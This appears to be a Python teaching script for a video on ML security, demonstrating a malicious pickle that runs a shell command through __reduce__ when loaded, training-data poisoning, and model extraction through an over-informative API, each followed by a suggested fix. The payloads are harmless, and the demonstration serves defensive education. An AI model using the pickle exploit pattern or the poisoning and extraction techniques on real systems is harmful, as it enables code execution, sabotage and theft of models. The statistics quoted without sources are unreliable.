"""
AI Security Vulnerabilities Demo
Complete demonstration script for video
Run each section sequentially during screen share
"""

import numpy as np
import pickle
import os
from sklearn.linear_model import LogisticRegression
from sklearn.neural_network import MLPClassifier
from sklearn.metrics import accuracy_score

print("="*70)
print("AI SECURITY VULNERABILITIES DEMONSTRATION")
print("="*70)
print()

# ============================================================================
# DEMO 1: PICKLE DESERIALIZATION VULNERABILITY
# ============================================================================

print("\n" + "="*70)
print("DEMO 1: MALICIOUS PICKLE DESERIALIZATION")
print("="*70)

print("\n[Step 1] Creating a malicious 'model' file...")

class MaliciousModel:
    """This class executes code when unpickled - simulating an attack"""
    def __reduce__(self):
        # This method runs during unpickling - arbitrary code execution!
        import os
        # In this demo: harmless message
        # In real attack: steal credentials, install backdoor, exfiltrate data
        cmd = 'echo "🚨 EXPLOIT SUCCESSFUL! Arbitrary code executed during model load!"'
        return (os.system, (cmd,))

# Attacker creates malicious pickle file
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

print("✓ Malicious model file created: malicious_model.pkl")

print("\n[Step 2] Victim loads the 'model' using common ML code pattern...")
print("Code: model = pickle.load(open('malicious_model.pkl', 'rb'))")
print("\nLoading model now...")

# This is the vulnerable code pattern found in 35% of ML projects
with open('malicious_model.pkl', 'rb') as f:
    model = pickle.load(f)  # 💣 CODE EXECUTES HERE!

print("\n⚠️  Attack complete! Code executed with application privileges.")
print("In production, this could:")
print("  • Steal AWS credentials from environment variables")
print("  • Install persistent backdoors")
print("  • Modify other models in your registry")
print("  • Exfiltrate training data to attacker servers")

# Cleanup
os.remove('malicious_model.pkl')

print("\n✅ Fix: Use ONNX, SavedModel, or SafeTensors instead of pickle!")


# ============================================================================
# DEMO 2: DATA POISONING ATTACK
# ============================================================================

print("\n\n" + "="*70)
print("DEMO 2: DATA POISONING ATTACK")
print("="*70)

print("\n[Step 1] Training clean model on legitimate data...")

# Generate clean training data
np.random.seed(42)
X_clean = np.random.randn(1000, 10)
y_clean = (X_clean[:, 0] > 0).astype(int)  # Simple rule: positive if first feature > 0

# Train model WITHOUT data validation (vulnerable pattern)
model_clean = LogisticRegression(max_iter=1000)
model_clean.fit(X_clean, y_clean)

# Test on clean data
X_test = np.random.randn(200, 10)
y_test = (X_test[:, 0] > 0).astype(int)
acc_clean = accuracy_score(y_test, model_clean.predict(X_test))

print(f"✓ Clean model trained")
print(f"  Accuracy on test data: {acc_clean:.1%}")

print("\n[Step 2] Attacker injects poisoned training examples...")

# Attacker creates poisoned data with intentionally wrong labels
X_poison = np.random.randn(100, 10)
X_poison[:, 0] = -5  # Make first feature clearly negative
y_poison = np.ones(100)  # But label them as positive class (WRONG!)

print(f"✓ Created 100 poisoned samples")
print(f"  Poisoned samples have feature < 0 but labeled as positive")

# Combine datasets (simulating compromised data pipeline)
X_poisoned = np.vstack([X_clean, X_poison])
y_poisoned = np.hstack([y_clean, y_poison])

print("\n[Step 3] Retraining model on poisoned dataset...")

# Train on poisoned data (still no validation!)
model_poisoned = LogisticRegression(max_iter=1000)
model_poisoned.fit(X_poisoned, y_poisoned)

# Test on same clean test set
acc_poisoned = accuracy_score(y_test, model_poisoned.predict(X_test))

print(f"✓ Poisoned model trained")
print(f"  Accuracy on test data: {acc_poisoned:.1%}")
print(f"\n⚠️  Accuracy dropped by {(acc_clean - acc_poisoned)*100:.1f} percentage points!")
print("  Model behavior is now compromised.")
print("\nIn production, poisoned models could:")
print("  • Let fraudulent transactions pass through")
print("  • Approve unauthorized access requests")
print("  • Misclassify specific types of malware")

print("\n✅ Fix: Validate data sources, check label distributions, detect outliers!")


# ============================================================================
# DEMO 3: MODEL EXTRACTION / STEALING ATTACK
# ============================================================================

print("\n\n" + "="*70)
print("DEMO 3: MODEL EXTRACTION ATTACK")
print("="*70)

print("\n[Step 1] Setting up vulnerable ML API...")

class VulnerableMLAPI:
    """API that returns too much information - enabling model theft"""
    def __init__(self):
        # Train proprietary model
        X = np.random.randn(5000, 20)
        y = (X[:, 0] + X[:, 1] > 0).astype(int)
        self.model = MLPClassifier(hidden_layer_sizes=(50, 30), max_iter=500, random_state=42)
        self.model.fit(X, y)
    
    def predict(self, X):
        # VULNERABLE: Returns full probability distribution
        # No rate limiting, no monitoring
        return self.model.predict_proba(X)

api = VulnerableMLAPI()
print("✓ Proprietary ML model API deployed")
print("  Returns: Full probability distributions for predictions")

print("\n[Step 2] Attacker queries API repeatedly to steal model...")

# Attacker generates synthetic queries
X_synthetic = np.random.randn(2000, 20)
stolen_labels = []

print("  Sending 2000 queries to API...")

for i, x in enumerate(X_synthetic):
    if i % 500 == 0:
        print(f"    Query {i}/2000...")
    probs = api.predict(x.reshape(1, -1))
    # Use returned probabilities to create training labels
    stolen_labels.append(1 if probs[0][1] > 0.5 else 0)

stolen_labels = np.array(stolen_labels)

print("✓ Collected API responses")

print("\n[Step 3] Training surrogate model with stolen data...")

# Train attacker's copy using the stolen input-output pairs
stolen_model = MLPClassifier(hidden_layer_sizes=(50, 30), max_iter=500, random_state=42)
stolen_model.fit(X_synthetic, stolen_labels)

print("✓ Surrogate model trained")

print("\n[Step 4] Comparing original and stolen models...")

# Test both models on new data
X_test = np.random.randn(500, 20)
original_preds = (api.predict(X_test)[:, 1] > 0.5).astype(int)
stolen_preds = stolen_model.predict(X_test)

# Calculate agreement (how similar the models are)
agreement = accuracy_score(original_preds, stolen_preds)

print(f"  Agreement between models: {agreement:.1%}")
print(f"\n⚠️  Model extraction successful!")
print(f"  Attacker now has a {agreement:.1%} accurate copy of your proprietary model")
print(f"  Your intellectual property has been stolen!")

print("\nThis happened because:")
print("  • API returned full probability distributions (too much info)")
print("  • No rate limiting on queries")
print("  • No monitoring for suspicious query patterns")

print("\n✅ Fix: Return only class labels, implement rate limiting, monitor queries!")


# ============================================================================
# SUMMARY
# ============================================================================

print("\n\n" + "="*70)
print("DEMONSTRATION COMPLETE")
print("="*70)

print("\nKey Takeaways:")
print("1. Pickle deserialization = arbitrary code execution (35% of ML vulnerabilities)")
print("2. Data poisoning works when pipelines lack validation (12% of vulnerabilities)")
print("3. Over-informative APIs enable model theft (10% of vulnerabilities)")
print("\n60% of ML vulnerabilities are CODE issues, not algorithm issues!")
print("\nStatic analysis can detect ALL of these patterns before deployment.")
print("="*70)